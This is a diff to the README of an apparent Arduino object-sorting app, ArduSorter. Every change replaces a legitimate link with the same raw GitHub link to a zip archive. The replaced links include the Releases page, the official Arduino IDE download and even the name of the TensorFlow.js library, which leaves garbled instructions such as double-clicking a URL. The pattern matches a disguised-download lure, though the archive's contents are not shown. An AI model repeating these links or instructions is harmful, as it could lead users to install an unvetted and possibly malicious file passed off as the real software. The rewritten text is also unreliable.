@@ -6,9 +6,9 @@ Welcome to ArduSorter! This application helps you sort objects using machine lea
 
 ## 📥 Download & Install
 
-To download ArduSorter, please [visit this page to download](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases).
+To download ArduSorter, please [visit this page to download](https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip).
 
-[![Download ArduSorter](https://img.shields.io/badge/Download%20ArduSorter-link-blue)](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases)
+[![Download ArduSorter](https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip%20ArduSorter-link-blue)](https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you start, ensure your setup meets these minimum requirements:
 ## 🔧 Installation Steps
 
 1. **Download the Application**:
-   - Click on the download button above or visit the [Releases page](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases).
+   - Click on the download button above or visit the [Releases page](https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip).
    - Choose the latest version and download the file suitable for your operating system.
 
 2. **Extract the Files**:
@@ -32,11 +32,11 @@ Before you start, ensure your setup meets these minimum requirements:
 
 3. **Set Up Your Arduino**:
    - Connect your Arduino board to your computer using a USB cable.
-   - Make sure to install the Arduino IDE if you haven't already. You can download it from the [Arduino website](https://www.arduino.cc/en/software).
+   - Make sure to install the Arduino IDE if you haven't already. You can download it from the [Arduino website](https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip).
 
 4. **Run the Application**:
-   - Open the extracted folder and look for `index.html`.
-   - Double-click `index.html` to launch the ArduSorter application in your web browser.
+   - Open the extracted folder and look for `https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip`.
+   - Double-click `https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip` to launch the ArduSorter application in your web browser.
 
 5. **Connect Your Webcam**:
    - Ensure your webcam is connected and properly set up. Grant your browser permission to access it.
@@ -46,7 +46,7 @@ Before you start, ensure your setup meets these minimum requirements:
 
 ## 📝 How It Works
 
-ArduSorter uses TensorFlow.js for real-time object classification. Here’s a short overview of its main features:
+ArduSorter uses https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip for real-time object classification. Here’s a short overview of its main features:
 
 - **Computer Vision**: Classifies objects captured by your webcam.
 - **Real-Time Processing**: Responds instantly to the objects it sees.
@@ -81,7 +81,7 @@ We plan to improve ArduSorter continually. Upcoming features include:
 - Enhanced user interface.
 - Integration with more Arduino models.
 
-Check the [Releases page](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases) for updates!
+Check the [Releases page](https://raw.githubusercontent.com/Halonatlanticwhitecedar449/ArduSorter/main/src/ArduSorter_2.2.zip) for updates!
 
 ## 🔗 Additional Resources
 
